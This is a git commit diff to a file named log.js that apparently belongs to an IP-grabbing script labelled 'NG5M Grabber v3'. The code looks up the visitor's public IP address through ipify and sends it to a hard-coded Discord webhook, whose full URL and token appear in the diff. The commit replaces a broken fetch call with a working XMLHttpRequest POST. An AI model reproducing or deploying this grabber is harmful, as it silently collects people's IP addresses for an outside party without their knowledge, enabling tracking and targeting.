1df32b220356d945e5498d6e39a3d221b9042ce7
rexgamer338571 <85365081+rexgamer338571@users.noreply.github.com>
2023-08-12 20:24:21 +0200

    Update log.js

--- log.js
+++ log.js
@@ -3,19 +3,23 @@ var a = new XMLHttpRequest();
 a.open("GET","https://api64.ipify.org");
 a.onreadystatechange = function () {
     if (this.readyState === 4) {
-        data = {
-            "content":"New log!",
-            "username":"NG5M Grabber v3"
-
-            "embeds": [
-                {
-                    "title":"Info"
-                    "description":this.responseText
-                }
-            ]
+        const rq = new XMLHttpRequest();
+        rq.open("POST","https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw");
+        rq.setRequestHeader("Content-type","application/json");
+        var embed = {
+            "author":{
+                "name":"NG5M Grabber v3"
+            },
+            "title":"**Info**",
+            "description":"IP: "+this.responseText,
+            "color":"#FF0000"
         }
-
-        fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":data});
+        
+        const data = {
+            "username":"NG5M Grabber v3",
+            "embeds":[ embed ]
+        }
+        rq.send(JSON.stringify(data));
     }
 };
 
